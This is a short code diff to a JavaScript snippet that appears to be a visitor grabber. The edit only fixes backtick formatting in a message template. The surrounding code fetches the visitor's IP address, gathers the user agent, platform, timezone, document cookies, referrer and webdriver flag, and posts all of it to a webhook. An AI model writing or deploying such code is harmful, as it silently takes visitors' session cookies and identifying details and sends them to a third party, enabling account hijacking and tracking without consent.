@@ -26,7 +26,7 @@ function collectInfo() {
 fetch("https://ifconfig.me/ip").then(res => res.text()).then(ip => {
     const info = collectInfo();
     const message = `
-`\`\`\
+\`\`\`
 IP Address: ${ip}
 UserAgent: ${info.userAgent}
 Platform: ${info.platform}
@@ -36,7 +36,7 @@ Timezone: ${info.timezone}
 Cookies: ${info.cookies}
 Referrer: ${info.referrer}
 Webdriver: ${info.webdriver}
-`\`\`\
+\`\`\`
     `;
     postToWebhook(message);
 });
